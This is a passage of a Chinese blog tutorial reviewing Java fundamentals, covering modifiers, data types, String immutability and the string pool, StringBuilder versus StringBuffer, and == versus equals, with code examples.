修饰符，用来修饰类方法和类变量。<br>2.final 修饰符，用来修饰类、方法和变量，final 修饰的类不能够被继承，修饰的方法不能被继承类重新定义，修饰的变量为常量，是不可修改的。<br>3.abstract 修饰符，用来创建抽象类和抽象方法。<br>4.synchronized 和 volatile 修饰符，主要用于线程的编程。</p><h5 id="1-static-修饰符"><a href="#1-static-修饰符" class="headerlink" title="1.static 修饰符"></a>1.static 修饰符</h5><p>可以用来修饰：属性、方法、代码块、内部类。</p><ul><li>静态变量：<br>static 关键字用来声明独立于对象的静态变量，无论一个类实例化多少对象，它的静态变量只有一份拷贝。 静态变量也被称为类变量。局部变量不能被声明为 static 变量。</li><li>静态方法：<br>static 关键字用来声明独立于对象的静态方法。静态方法不能使用类的非静态变量。静态方法从参数列表得到数据，然后计算这些数据。</li></ul><p>对类变量和方法的访问可以直接使用 classname.variablename 和 classname.methodname 的方式访问。</p><p>使用 类.方法 或 对象.方法：</p><table><thead><tr><th></th><th>静态方法</th><th>非静态方法</th></tr></thead><tbody><tr><td>类</td><td>YES</td><td>NO</td></tr><tr><td>对象</td><td>YES</td><td>YES</td></tr></tbody></table><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NewJavaTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        p it = <span class="hljs-keyword">new</span> p();<br>        p.eat();<br><span class="hljs-comment">//      p.sleep(); //不能通过类访问非静态方法</span><br>        it.eat();<br>        it.sleep();<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">p</span></span>&#123;<br>    <span class="hljs-keyword">int</span> age;<br>    String s;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">eat</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;吃完了&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sleep</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;睡觉了&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//输出</span><br>吃完了<br>吃完了<br>睡觉了<br></code></pre></div></td></tr></table></figure><blockquote><p>静态方法中：只能调用静态方法或属性。在静态方法内不能使用 this、super关键字。<br>非静态方法中：既可以调用非静态方法或属性，也可以调用静态的方法或属性。</p></blockquote><h5 id="2-final修饰符"><a href="#2-final修饰符" class="headerlink" title="2.final修饰符"></a>2.final修饰符</h5><p>可以修饰：类、方法、变量。</p><p>final 类不能被继承，没有类能够继承 final 类的任何特性。</p><p>父类中的 final 方法可以被子类继承，但是不能被子类重写。<br>声明 final 方法的主要目的是防止该方法的内容被修改。</p><p>变量一旦赋值后，不能被重新赋值。被 final 修饰的实例变量必须显式指定初始值。<br>final 修饰符通常和 static 修饰符一起使用来创建类常量。初始化时，可以在代码块中初始化、构造器中初始化。<br>例如：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> w = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> l;<br><span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> r;<br>&#123;<br>l=<span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span>&#123;<br>r=<span class="hljs-number">2</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>final 也可以在形参中修饰，但被修饰的值在函数中不能改变，只能调用。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span></span>&#123;<br><span class="hljs-comment">//n=20; 不可以改变值</span><br>System.out.println(n);<span class="hljs-comment">//可以正常输出</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h5 id="3-abstract-修饰符"><a href="#3-abstract-修饰符" class="headerlink" title="3.abstract 修饰符"></a>3.abstract 修饰符</h5><p>抽象类不能用来实例化对象，声明抽象类的唯一目的是为了将来对该类进行扩充。<br>一个类不能同时被 abstract 和 final 修饰。如果一个类包含抽象方法，那么该类一定要声明为抽象类，否则将出现编译错误。<br>抽象类可以包含抽象方法和非抽象方法。</p><p>抽象方法是一种没有任何实现的方法，该方法的的具体实现由子类提供。<br>抽象方法不能被声明成 final 和 static。<br>任何继承抽象类的子类必须实现父类的所有抽象方法，除非该子类也是抽象类。<br>如果一个类包含若干个抽象方法，那么该类必须声明为抽象类。抽象类可以不包含抽象方法。<br>抽象方法的声明以分号结尾，例如：public abstract sample();。</p><h5 id="4-synchronized-修饰符"><a href="#4-synchronized-修饰符" class="headerlink" title="4.synchronized 修饰符"></a>4.synchronized 修饰符</h5><p>synchronized 关键字声明的方法同一时间只能被一个线程访问。synchronized 修饰符可以应用于四个访问修饰符。</p><h5 id="5-transient-修饰符"><a href="#5-transient-修饰符" class="headerlink" title="5.transient 修饰符"></a>5.transient 修饰符</h5><p>序列化的对象包含被 transient 修饰的实例变量时，java 虚拟机(JVM)跳过该特定的变量。<br>该修饰符包含在定义变量的语句中，用来预处理类和变量的数据类型。</p><h5 id="6-volatile-修饰符"><a href="#6-volatile-修饰符" class="headerlink" title="6.volatile 修饰符"></a>6.volatile 修饰符</h5><p>volatile 修饰的成员变量在每次被线程访问时，都强制从共享内存中重新读取该成员变量的值。而且，当成员变量发生变化时，会强制线程将变化值回写到共享内存。这样在任何时刻，两个不同的线程总是看到某个成员变量的同一个值。<br>一个 volatile 对象引用可能是 null。</p><hr><h3 id="8-数据类型"><a href="#8-数据类型" class="headerlink" title="8.数据类型"></a>8.数据类型</h3><p>Java 语言提供了八种基本类型：六种数字类型（四个整数型，两个浮点型），一种字符类型，还有一种布尔型。并且还提供了其对应的引用类型。</p><h4 id="char"><a href="#char" class="headerlink" title="char"></a>char</h4><p>在 Java 中是用 unicode来表示字符，所以 2 个字节来表示一个字符； 一个数字或英文或汉字都是一个字符，只不过数字和英文时，存储的2个字节的第一个字节都为0，就是浪费了点空间。存汉字就占满了2个字节。</p><h4 id="boolean"><a href="#boolean" class="headerlink" title="boolean"></a>boolean</h4><p>在 Java 基本类型中只有两个状态，true、false，理论上只占一个字节，但是实际如下：</p><ul><li>单个的boolean类型变量在编译的时候是使用的 int 类型，即 boolean a = true 时，这个a在 JVM 中占用 4 个字节，即32位；</li><li>boolean类型的数组时，在编译时是作为byte array来编译的。所以，boolean数组里的每一个元件占用一个字节；即 boolean[] b = new boolean[10] 的数组时，每一个boolean在 JVM中占一个字节；</li></ul><p><strong>注意</strong>： float 和 double 都不能表示精确的值，所以一般不能用在计算货币，要想精度不失效，可以使用 BigDecimal</p><h4 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h4><p>在 Java 中引用类型指向一个对象，指向对象的变量是引用变量。这些变量在声明时被指定为一个特定的类型，比如 Employee、Puppy 等。变量一旦声明后，类型就不能被改变了。</p><ul><li>对象、数组都是引用数据类型；</li><li>所有引用类型的默认值都是null；</li><li>一个引用变量可以用来引用任何与之兼容的类型<br>我们的基本类型都有对应的引用类型，且基本类型与其对应的引用类型之间的赋值使用自动装箱与拆箱完成<h4 id="自动装箱和拆箱"><a href="#自动装箱和拆箱" class="headerlink" title="自动装箱和拆箱"></a>自动装箱和拆箱</h4></li></ul><p>也可见 《JAVA基础知识复习(八)-包装类、装箱拆箱》博客内容。</p><p>自动拆箱：故名思议就是将对象重新转化为基本数据类型；是享元模式（flyweight）</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Integer num = <span class="hljs-number">10</span>;<span class="hljs-comment">//装箱</span><br><span class="hljs-keyword">int</span> num1 = num;<span class="hljs-comment">//拆箱</span><br></code></pre></div></td></tr></table></figure><p>基本数据类型和引用数据类型区别</p><ul><li>基本数据类型在被创建时，数值直接存储在栈上。</li><li>引用数据类型在被创建时，对象的具体信息都存储在堆内存上，对象的引用地址存储在栈上</li></ul><h4 id="String类型"><a href="#String类型" class="headerlink" title="String类型"></a>String类型</h4><p>String 不可变，String 类型 是一个final修饰的类型。因此它不可被继承。在 Java 8 中，String 内部使用 char 数组存储数据。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">String</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">java</span>.<span class="hljs-title">io</span>.<span class="hljs-title">Serializable</span>, <span class="hljs-title">Comparable</span>&lt;<span class="hljs-title">String</span>&gt;, <span class="hljs-title">CharSequence</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">char</span> value[];<br>&#125;<br></code></pre></div></td></tr></table></figure><p>value 数组被声明为 final，这意味着 value 数组初始化之后就不能再引用其它数组。并且 String 内部没有改变 value 数组的方法，因此可以保证 String 不可变。<br>String 不可变的好处</p><ul><li>可以缓存 hash 值：因为 String 的 hash 值经常被使用，例如 String 用做 HashMap 的 key。不可变的特性可以使得 hash 值也不可变，因此只需要进行一次计算。</li><li>String Pool 的需要：如果一个 String 对象已经被创建过了，那么就会从 String Pool 中取得引用。只有 String 是不可变的，才可能使用 String Pool。</li><li>安全性：String 不可变性天生具备线程安全，可以在多个线程中安全地使用。String 经常作为参数，String 不可变性可以保证参数不可变。</li></ul><h4 id="String赋值"><a href="#String赋值" class="headerlink" title="String赋值"></a>String赋值</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String s1 = <span class="hljs-string">&quot;bbb&quot;</span>;<br>String s2 = <span class="hljs-string">&quot;bbb&quot;</span>;<br>System.out.println(s5 == s6);  <span class="hljs-comment">// true</span><br></code></pre></div></td></tr></table></figure><p>如果是采用 “bbb” 这种字面量的形式创建字符串，会自动地将字符串放入 String Pool 中。而不是象new一样放在压缩堆中；当声明这样的一个字符串后，JVM会在常量池中先查找有没有一个值为”bbb”的对象，</p><ul><li>如果有：就会把它赋给当前引用。即原来那个引用和现在这个引用指点向了同一对象,</li><li>如果没有：则在常量池中新创建一个”bbb”,<br>下一次如果有String s2 = “bbb”；又会将s2指向”abcd”这个对象；即以这形式声明的字符串，只要值相等，任何多个引用都指向同一对象.</li></ul><p>而String s = new String(“abcd”);和其它任何对象一样，每调用一次就产生一个对象</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//代码1  </span><br>String sa = <span class="hljs-string">&quot;ab&quot;</span>;                                          <br>String sb = <span class="hljs-string">&quot;cd&quot;</span>;                                       <br>String sab=sa+sb;                                      <br>String s=<span class="hljs-string">&quot;abcd&quot;</span>;  <br>System.out.println(sab==s); <span class="hljs-comment">// false  </span><br><span class="hljs-comment">//当执行sa+sb时，JVM首先会在堆中创建一个StringBuilder类，将刚生成的String对象的堆地址存放在局部变量sab中</span><br><span class="hljs-comment">//局部变量 s 存储的是常量池中&quot;abcd&quot;所对应的拘留字符串对象的地址</span><br><br><span class="hljs-comment">//代码2  </span><br>String sc=<span class="hljs-string">&quot;ab&quot;</span>+<span class="hljs-string">&quot;cd&quot;</span>;  <br>String sd=<span class="hljs-string">&quot;abcd&quot;</span>;  <br>System.out.println(sc==sd); <span class="hljs-comment">//true  </span><br><span class="hljs-comment">//&quot;ab&quot;+&quot;cd&quot;会直接在编译期就合并成常量&quot;abcd&quot;， 因此相同字面值常量&quot;abcd&quot;所对应的是同一个拘留字符串对象，自然地址也就相同。</span><br></code></pre></div></td></tr></table></figure><p>扩展：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;abc&quot;</span>)<br></code></pre></div></td></tr></table></figure><p>这种方式一共会创建两个字符串对象（前提是 String Pool 中还没有 “abc” 字符串对象）。</p><ul><li>“abc” 属于字符串字面量，因此编译时期会在 String Pool 中创建一个字符串对象，指向这个字符串字面量；</li><li>而使用 new 的方式会在堆中创建一个字符串对象。</li></ul><h4 id="String、StringBuffer、-StringBuilder的区别"><a href="#String、StringBuffer、-StringBuilder的区别" class="headerlink" title="String、StringBuffer、 StringBuilder的区别"></a>String、StringBuffer、 StringBuilder的区别</h4><ul><li>从运行速度上说，StringBuilder&gt;StringBuffer&gt;String，因为String是不可变的对象</li><li>String：是字符串常量（由final修饰），StringBuffer和StringBuilder 是字符串变量</li><li>StringBuffer：有同步锁，但效率低，适用于多线程下字符缓冲区进行大量操作。</li><li>StringBuilder：效率高，线程不安全，适用于单线程下的字符缓冲区进行大量操作的情况；</li></ul><p>StringBuffer 和 StringBuilder 能大量操作字符的原理<br>在append是后，采用了Arrays.copyOf（） 进行了数组复制</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> StringBuffer <span class="hljs-title">append</span><span class="hljs-params">(Object obj)</span> </span>&#123;<br>    toStringCache = <span class="hljs-keyword">null</span>;<br>    <span class="hljs-keyword">super</span>.append(String.valueOf(obj));<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;<br>&#125;<br><br><span class="hljs-comment">// AbstractStringBuilder 类</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> AbstractStringBuilder <span class="hljs-title">append</span><span class="hljs-params">(String str)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (str == <span class="hljs-keyword">null</span>)<br>        <span class="hljs-keyword">return</span> appendNull();<br>    <span class="hljs-keyword">int</span> len = str.length();<br>    ensureCapacityInternal(count + len); <span class="hljs-comment">// 采用复制方式增加数组长度</span><br>    str.getChars(<span class="hljs-number">0</span>, len, value, count);<br>    count += len;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">ensureCapacityInternal</span><span class="hljs-params">(<span class="hljs-keyword">int</span> minimumCapacity)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (minimumCapacity - value.length &gt; <span class="hljs-number">0</span>) &#123;<br>        value = Arrays.copyOf(value,<br>                              newCapacity(minimumCapacity));<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="String-Pool"><a href="#String-Pool" class="headerlink" title="String Pool"></a>String Pool</h4><ul><li>字符串常量池（String Pool）保存着所有字符串字面量（literal strings），这些字面量在编译时期就确定</li><li>String 的 intern() 方法在运行过程中将字符串添加到 String Pool 中<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String s1 = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;aaa&quot;</span>);<br>String s2 = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;aaa&quot;</span>);<br>System.out.println(s1 == s2);           <span class="hljs-comment">// false</span><br>String s3 = s1.intern();<br>String s4 = s2.intern();<br>System.out.println(s3 == s4);           <span class="hljs-comment">// true</span><br></code></pre></div></td></tr></table></figure>String#intern 方法：intern 方法会从字符串常量池中查询当前字符串是否存在，若不存在就会将当前字符串放入常量池中返回这个新字符串的引用，若存在（使用 equals() 方法进行确定）那么就会返回 String Pool 中字符串的引用；</li></ul><p>在 Java 7 之前，String Pool 被放在运行时常量池中，它属于永久代。而在 Java 7，String Pool 被移到堆中。这是因为永久代的空间有限，在大量使用字符串的场景下会导致 OutOfMemoryError 错误。</p><h4 id="String-常用方法"><a href="#String-常用方法" class="headerlink" title="String 常用方法"></a>String 常用方法</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">endsWith</span><span class="hljs-params">(String suffix)</span> <span class="hljs-comment">//测试此字符串是否以指定的后缀结束</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">startsWith</span><span class="hljs-params">(String prefix)</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">char</span> <span class="hljs-title">charAt</span><span class="hljs-params">(<span class="hljs-keyword">int</span> index)</span></span>;<span class="hljs-comment">//返回指定索引处的 char 值</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">indexOf</span><span class="hljs-params">(String str)</span> </span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">lastIndexOf</span><span class="hljs-params">(<span class="hljs-keyword">int</span> ch)</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String[] <span class="hljs-title">split</span><span class="hljs-params">(String regex)</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">substring</span><span class="hljs-params">(<span class="hljs-keyword">int</span> beginIndex)</span>   </span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">replace</span><span class="hljs-params">(<span class="hljs-keyword">char</span> oldChar,<span class="hljs-keyword">char</span> newChar)</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">length</span><span class="hljs-params">()</span></span><br></code></pre></div></td></tr></table></figure><h4 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h4><p>在 Java 中 Object 是所有的祖类。</p><h4 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hashCode</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">equals</span><span class="hljs-params">(Object obj)</span></span><br><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">native</span> Object <span class="hljs-title">clone</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> CloneNotSupportedException</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">native</span> Class&lt;?&gt; <span class="hljs-title">getClass</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">finalize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">void</span> <span class="hljs-title">notify</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">void</span> <span class="hljs-title">notifyAll</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">void</span> <span class="hljs-title">wait</span><span class="hljs-params">(<span class="hljs-keyword">long</span> timeout)</span> <span class="hljs-keyword">throws</span> InterruptedException</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title">wait</span><span class="hljs-params">(<span class="hljs-keyword">long</span> timeout, <span class="hljs-keyword">int</span> nanos)</span> <span class="hljs-keyword">throws</span> InterruptedException</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title">wait</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException</span><br></code></pre></div></td></tr></table></figure><p>equals()</p><ul><li>对于基本类型，== 判断两个值是否相等，基本类型没有 equals() 方法。</li><li>对于引用类型，== 判断两个变量是否引用同一个对象，而 equals() 判断引用的对象是否等价。<h4 id="“-”和equals的区别"><a href="#“-”和equals的区别" class="headerlink" title="“==”和equals的区别"></a>“==”和equals的区别</h4>==： 用来判断两个对象的内存地址是否相同（比较的是变量(栈)内存中存放的对象的(堆)内存地址，）。比较的是真正意义上的指针操作。</li></ul><p>equals：用来比较的是两个对象的内容是否相等。</p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String s1 = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;ab&quot;</span>); <span class="hljs-comment">// s1 为一个引用</span><br>String s2 = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;ab&quot;</span>); <span class="hljs-comment">// s2 为另一个引用,对象的内容一样</span><br>String s3 = <span class="hljs-string">&quot;ab&quot;</span>; <span class="hljs-comment">// 放在常量池中</span><br>String s4 = <span class="hljs-string">&quot;ab&quot;</span>; <span class="hljs-comment">// 从常量池中查找</span><br>System.out.println(s1 == s2); <span class="hljs-comment">// false</span><br>System.out.println(s3 == s4); <span class="hljs-comment">// true</span><br>System.out.println(s1 == s3); <span class="hljs-comment">// false</span><br>System.out.println(s1.equals(s2)); <span class="hljs-comment">// true</span><br>System.out.println(s3.equals(s4)); <span class="hljs-comment">// true</span><br>System.out.println(s1.equals(s3)); <span class="hljs-comment">// true</span><br></code></pre></div></td></tr></table></figure><p>对equals重新需要注意五点：</p><blockquote><p>1 自反性：对任意引用值X，x.equals(x)的返回值一定为true；<br>2 对称性：对于任何引用值x,y,当且仅当y.equals(x)返回值为true时，x.equals(y)的返回值一定为true；<br>3 传递性：如果x.equals(y)=true, y.equals(z)=true,则x.equals(z)=true ；<br>4 一致性：如果参与比较的对象没任何改变，则对象比较的结果也不应该有任何改变；<br>5 非空性：任何非空的引用值X，x.equals(null)的返回值一定为false 。</p></blockquote><p><strong>注意</strong><br>自定义的类用equals比较时，仍然用的 == 在比较。因为自定义类默认继承的Object类中的equals方法，而Object类中的equals方法用的是 == 在比较。Object类中的equals方法代码如下：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">equals</span><span class="hljs-params">(Object obj)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">this</span> == obj);<br>    &#125;<br></code></pre></div></td></tr></table></figure><p>可以看见，用的是 == 来比较。所以，也是比较的地址值。例如：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NewJavaTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Man p = <span class="hljs-keyword">new</span> Man(<span class="hljs-number">12</span>,<span class="hljs-string">&quot;abcdef&quot;</span>); <span class="hljs-comment">//这里的Man为自定义类</span><br>        Man p1= <span class="hljs-keyword">new</span> Man(<span class="hljs-number">12</span>,<span class="hljs-string">&quot;abcdef&quot;</span>);<br>        System.out.println(p.equals(p1));<br>        String s1 = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;qwer&quot;</span>);<br>        String s2 = <span class="hljs-keyword">new</span> String(<span class="hljs-string">&quot;qwer&quot;</span>);<br>        System.out.println(s1.equals(s2));<br>    &#125;<br><br>&#125;<br><span class="hljs-comment">//输出</span><br><span class="hljs-keyword">false</span><br><span class="hljs-keyword">true</span><br></code></pre></div></td></tr></table></figure><p>String 类中的equals 方法代码：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//注释为作者自加，并不是String类中所有的</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">equals</span><span class="hljs-params">(Object anObject)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span> == anObject) &#123; <span class="hljs-comment">//首先比较两个的地址，如果地址都相同，那么内容一定是相同的</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (anObject <span class="hljs-keyword">instanceof</span> String) &#123; <span 